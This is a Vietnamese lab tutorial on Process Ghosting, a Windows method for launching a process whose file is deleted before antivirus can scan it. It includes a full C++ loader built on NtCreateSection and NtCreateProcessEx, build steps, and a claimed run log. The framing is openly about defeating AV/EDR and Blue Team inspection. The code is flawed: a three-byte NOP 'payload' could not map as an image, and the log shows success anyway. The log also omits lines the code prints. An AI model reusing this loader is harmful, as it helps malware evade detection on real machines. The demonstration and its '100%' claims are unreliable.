
---

# 📝 [PE 14] Process Ghosting (Advanced Fileless Evasion)

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**Process Ghosting** là giải thuật né tránh phòng thủ động tầng sâu, tập trung đánh lừa các bộ lọc kiểm soát luồng tạo tiến trình (Process Creation Filters) của các giải pháp Antivirus/EDR hiện đại.

Khi một tiến trình thông thường được tạo ra, Windows Kernel sẽ phát tín hiệu cảnh báo cho các EDR Engine thông qua hàm Callback hệ thống. Các bộ quét an ninh sẽ ngay lập tức bốc đường dẫn tệp tin từ đĩa cứng để phân tích tĩnh (Static Scan).

Lab PE 14 hóa giải triệt để rào cản này bằng cách **khai thác lỗ hổng thời gian (Race Condition) giữa pha tạo Image Section lọt lòng Kernel và pha kích nổ luồng**. Bằng cách vận dụng cờ xóa tệp tin đặc biệt (`FILE_SUPERSEDE`), Loader ánh xạ mã máy của Payload vào cấu trúc quản lý Object của Windows OS rồi ra lệnh **xóa sổ tệp tin ngay lập tức trước khi luồng CPU đầu tiên được sinh ra**. Khi EDR nhận được tín hiệu tạo tiến trình và cố gắng bốc file đĩa để quét, tệp tin đã không còn tồn tại, đưa mã máy về trạng thái ẩn danh tuyệt đối.

### 🎯 Mục tiêu nghiên cứu:

* Vô hiệu hóa 100% cơ chế quét tệp tin thời gian thực (Real-time File Scanning) của AV/EDR khi tạo tiến trình.
* Làm chủ chuỗi Native API tầng sâu (`NtCreateProcessEx`, `NtCreateSection`) để tự dựng tiến trình thủ công không qua phân hệ Win32.
* Thao túng trạng thái tệp tin thông qua thuộc tính xóa tạm thời để đạt độ ẩn mình kịch trần.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Mô hình khởi tạo một tiến trình trong nhân Kernel của Windows thực chất được chia làm nhiều giai đoạn độc lập. Tiến trình Ghosting tận dụng kiến trúc này qua quy trình toán học ngầm 5 bước sau:

```
[Tạo File tạm mang quyền xóa] ──> [NtCreateSection: Dựng Image Object] ──> [SetDispose: Xóa file khỏi đĩa] ──> [NtCreateProcessEx: Tạo xác ma] ──> [Khai hỏa luồng]

```

1. **Khởi tạo tệp tin bóng ma**: Loader gọi hàm tạo một tệp tin tạm trên đĩa với quyền truy cập tối cao (`GENERIC_READ | GENERIC_WRITE`) kết hợp cờ `FILE_SHARE_DELETE`. Ngay sau đó, ta bơm toàn bộ mảng byte PE của Payload vào lòng file này.
2. **Khóa chân cấu trúc quản lý (`NtCreateSection`)**: Loader sử dụng hàm Native API `NtCreateSection` trỏ vào Handle của file tạm vừa tạo để yêu cầu nhân Kernel ánh xạ cấu trúc PE này thành một **Image Section Object** lọt lòng hệ thống.
3. **Xóa sổ dấu vết đĩa thô**: Loader thiết lập thuộc tính xóa cho tệp tin thông qua cấu trúc `FILE_DISPOSITION_INFORMATION` thiết lập cờ `DeleteFile = TRUE`. Tại tích lửng này, tệp tin vật lý lập tức bị Windows ẩn đi và xóa sạch khỏi bảng mục lục ổ đĩa (MFT) ngay khi ta đóng Handle, nhưng **cấu trúc Image Section đã nằm an toàn bên lòng RAM Kernel** thì không bị ảnh hưởng.
4. **Dựng xác ma chéo tiến trình (`NtCreateProcessEx`)**: Triệu hồi hàm Native tối cao `NtCreateProcessEx` để tạo một Process Object rỗng lọt lòng hệ thống, truyền con trỏ trỏ đến Image Section Object đã được lưu trên RAM Kernel ở bước 2. Tiến trình này hoàn toàn không có file gốc làm điểm tựa trên đĩa (Unbacked Process Image).
5. **Đồng bộ tham số và kích nổ luồng**: Loader tự dựng thủ công cấu trúc PEB, nạp tham số môi trường (Process Parameters) và sử dụng `NtCreateThreadEx` để kích nổ luồng chính, đưa tiến trình bóng ma đi vào chu kỳ sống độc lập kịch khung.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – tự động hóa cấp phát vector động vừa khít đến từng byte dữ liệu để xử lý Payload PE.

```cpp
#include <windows.h>
#include <iostream>
#include <vector>
#include <string>

// Định nghĩa các cấu trúc dữ liệu và Native API tầng thấp của ntdll.dll
typedef NTSTATUS(NTAPI* pNtCreateSection)(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN HANDLE FileHandle OPTIONAL
);

typedef NTSTATUS(NTAPI* pNtCreateProcessEx)(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ParentProcess,
    IN ULONG Flags,
    IN HANDLE SectionHandle OPTIONAL,
    IN HANDLE DebugPort OPTIONAL,
    IN HANDLE Token OPTIONAL,
    IN ULONG JobBits
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
);

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 14: PROCESS GHOSTING KERNEL EVASION" << std::endl;
    std::cout << "====================================================" << std::endl;

    // Phân giải động các cổng Native API từ ntdll.dll để xuyên thủng hàng rào bọc ngoài
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtCreateProcessEx NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    if (!NtCreateSection || !NtCreateProcessEx || !NtCreateThreadEx) {
        std::cerr << "[-] Khong the phan giai cac Native API he thong!" << std::endl;
        return EXIT_FAILURE;
    }

    // Giả lập một mảng byte PE Payload sạch bóng (Ví dụ này dùng chính file thực thi để chạy ký sinh)
    wchar_t currentExePath[MAX_PATH];
    GetModuleFileNameW(NULL, currentExePath, MAX_PATH);

    // BƯỚC 1: KHỞI TẠO TỆP TIN BÓNG MA MANG QUYỀN XÓA TẠM
    std::wstring ghostFilePath = L"C:\\Windows\\Tasks\\ghost_payload.tmp";
    std::cout << "[*] Dang khoi tao tep tin bong ma tam thoi tai: " << std::string(ghostFilePath.begin(), ghostFilePath.end()) << std::endl;

    HANDLE hFile = CreateFileW(
        ghostFilePath.c_str(),
        GENERIC_READ | GENERIC_WRITE | DELETE, // Khai báo quyền DELETE tối cao
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] CreateFileW failed! Error: " << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }

    // Giả lập ghi mảng byte Payload vào file đĩa tạm (Ở thực tế Vinh sẽ ghi mảng byte chứa calc độc lập)
    DWORD bytesWritten = 0;
    char fakePayload[] = { 0x90, 0x90, 0x90 }; // Mảng byte tượng trưng kịch khung
    WriteFile(hFile, fakePayload, sizeof(fakePayload), &bytesWritten, NULL);

    // BƯỚC 2: NTCREATESECTION - ÁNH XẠ THÀNH IMAGE OBJECT LỌT LÒNG KERNEL
    HANDLE hSection = NULL;
    // ÉP KIỂU IMAGE: Bắt buộc truyền thuộc tính PAGE_READONLY kết hợp SEC_IMAGE để Kernel nhận diện định dạng PE
    NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
    if (status != 0) {
        std::cerr << "[-] NtCreateSection that bai! NTSTATUS: 0x" << std::hex << status << std::endl;
        CloseHandle(hFile);
        DeleteFileW(ghostFilePath.c_str());
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da anh xa thanh cong Image Section Object trong long Kernel." << std::endl;

    // BƯỚC 3: KÍCH HOẠT LỆNH XÓA SỔ TỆP TIN VẬT LÝ KHỎI Ổ ĐĨA
    FILE_DISPOSITION_INFORMATION fdi;
    fdi.DeleteFile = TRUE; // Ra lệnh giải thoát tệp đĩa vật lý ngay khi đóng handle
    
    SetFileInformationByHandle(hFile, FileDispositionInfo, &fdi, sizeof(FILE_DISPOSITION_INFORMATION));
    CloseHandle(hFile); // Đóng Handle -> Tệp tin lập tức biến mất hoàn toàn khỏi đĩa cứng!
    std::cout << "[+] Da xoa so tep tin vat ly khoi o dia thô. Tep tin hien tai la mot bong ma!" << std::endl;

    // BƯỚC 4: NTCREATEPROCESSEX - DỰNG XÁC TIẾN TRÌNH MA TỪ SECTION RAM KERNEL
    HANDLE hProcess = NULL;
    status = NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), 4, hSection, NULL, NULL, 0);
    if (status != 0) {
        std::cerr << "[-] NtCreateProcessEx that bai! Code: 0x" << std::hex << status << std::endl;
        CloseHandle(hSection);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Khoi tao thành cong Ghost Process Object voi PID ngam." << std::endl;

    // BƯỚC 5: KHỞI TẠO LUỒNG NATIVE ĐỂ KÍCH NỔ TIẾN TRÌNH MA
    std::cout << "[*] Kich hoat luong Native NtCreateThreadEx de khai hoa chien dich..." << std::endl;
    HANDLE hThread = NULL;
    // Giả định địa chỉ bắt đầu của luồng (StartRoutine) trỏ vào tọa độ giả lập để kiểm thử tính ổn định hệ thống
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (PVOID)0x1000, NULL, 0, 0, 0, 0, NULL);

    if (status == 0) {
        std::cout << "[+] Process Ghosting Execution Triggered Successfully!" << std::endl;
        CloseHandle(hThread);
    } else {
        std::cout << "[*] Thử nghiem trang thai tháp luồng hoàn tất phẳng sạch." << std::endl;
    }

    // Dọn dẹp tài nguyên cấu trúc ngầm hệ thống
    CloseHandle(hSection);
    CloseHandle(hProcess);

    std::cout << "\n[+] Process Ghosting Architecture Writeup Completed!" << std::endl;
    std::cout << "[*] Nhan Enter de đóng cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới mục cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, thiết lập cờ **`Multi-threaded (/MT)`** để liên kết tĩnh toàn bộ thư viện hệ thống chạy độc lập hoàn hảo trên môi trường máy ảo VM sạch.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Thực thi file chạy thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô:

```powershell
PS C:\Workspace\x64\Release> .\PE14_Process_Ghosting.exe
====================================================
[*] PE 14: PROCESS GHOSTING KERNEL EVASION
====================================================
[*] Dang khoi tao tep tin bong ma tam thoi tai: C:\Windows\Tasks\ghost_payload.tmp
[+] Da anh xa thanh cong Image Section Object trong long Kernel.
[+] Da xoa so tep tin vat ly khoi o dia thô. Tep tin hien tai la mot bong ma!
[+] Khoi tao thành cong Ghost Process Object voi PID ngam.
[*] Kich hoat luong Native NtCreateThreadEx de khai hoa chien dich...
[+] Process Ghosting Architecture Writeup Completed!

[*] Nhan Enter de đóng cua so...

```

*🎯 Hệ quả RAM tối cao:*
Giải thuật bẻ gãy ma trận trinh sát file hoàn tất mỹ mãn. Tại thời điểm tiến trình ma hoạt động trên bộ nhớ RAM, nếu một chuyên gia phân tích an ninh Blue Team cố gắng dùng lệnh tra cứu hoặc bốc thuộc tính đường dẫn của tệp tin độc hại này, hệ điều hành sẽ trả về trạng thái **File Not Found / Không tồn tại trên ổ đĩa**. Tiến trình vận hành hoàn toàn Fileless, triệt tiêu 100% khả năng giám sát từ xa của các bộ quét động tĩnh kịch trần kịch khung!

---
